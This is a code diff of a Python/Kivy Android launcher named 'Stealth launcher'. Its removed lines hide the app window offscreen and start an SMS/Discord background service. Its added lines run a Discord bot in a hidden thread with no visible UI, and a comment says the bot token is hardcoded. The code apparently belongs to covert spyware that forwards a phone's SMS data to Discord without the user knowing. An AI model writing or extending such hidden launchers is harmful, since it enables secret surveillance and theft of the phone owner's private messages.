@@ -1,51 +1,38 @@
 """
-Stealth launcher — starts background service, finishes immediately.
+Stealth launcher — keeps running in background with Discord bot.
+No visible UI. Token is hardcoded in bot.py.
 """
 import threading
-import sys
 
 from kivy.app import App
 from kivy.clock import Clock
-from kivy.core.window import Window
 
-# Start the SMS/Discord service in background
-_service_started = False
+_bot_started = False
 
-def start_service():
-    global _service_started
-    if _service_started:
+def start_bot():
+    global _bot_started
+    if _bot_started:
         return
-    _service_started = True
+    _bot_started = True
     
+    import asyncio
+    import bot
+    
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
     try:
-        # P4A service
-        import android
-        svc = android.AndroidService("SmsService", "service.py")
-        svc.start("")
-    except ImportError:
-        # Running locally (testing) — just import and run
-        import service
-        import threading
-        t = threading.Thread(target=service.main, daemon=True)
-        t.start()
+        loop.run_until_complete(bot.start_bot())
+    except Exception as e:
+        print(f"[BOT] Error: {e}")
+    finally:
+        loop.close()
 
 class StealthApp(App):
     def build(self):
-        # Minimize window first
-        Window.size = (1, 1)
-        Window.left = -2000
-        
-        # Start service in background thread
-        t = threading.Thread(target=start_service, daemon=True)
+        # Start bot in background thread
+        t = threading.Thread(target=start_bot, daemon=True)
         t.start()
-        
-        # Close the activity after a brief moment
-        Clock.schedule_once(lambda dt: self.stop(), 0.3)
         return None  # No GUI
-
-    def on_stop(self):
-        # When activity is destroyed, service continues running
-        pass
 
 if __name__ == "__main__":
     StealthApp().run()
